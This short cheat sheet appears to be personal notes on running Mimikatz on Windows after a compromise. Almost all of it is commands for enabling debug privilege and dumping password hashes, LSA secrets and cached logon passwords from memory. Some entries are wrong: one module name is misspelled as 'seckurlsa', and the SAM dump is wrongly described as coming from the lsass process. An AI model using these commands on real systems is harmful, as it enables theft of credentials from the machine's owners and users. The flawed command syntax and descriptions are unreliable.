- Windows post exploitation tool to dump password hashes, Kerberos tickets from memory
- Makes the use of lsass.exe process which contains caches password hashes in it's memory.
```bash
.\mimikatz.exe
```
- Check if nessesary privilege are there or not
	```bash
	privilege::debug
	<should print '20' OK
	```
- Dump hashes from lsass process
	```bash
	lsadump::sam
	```
- Dump secrets from lsass process
	```bash
	lsadump::secrets
	```
- Dump logon passwords
	```bash
	seckurlsa::logonpasswords
	```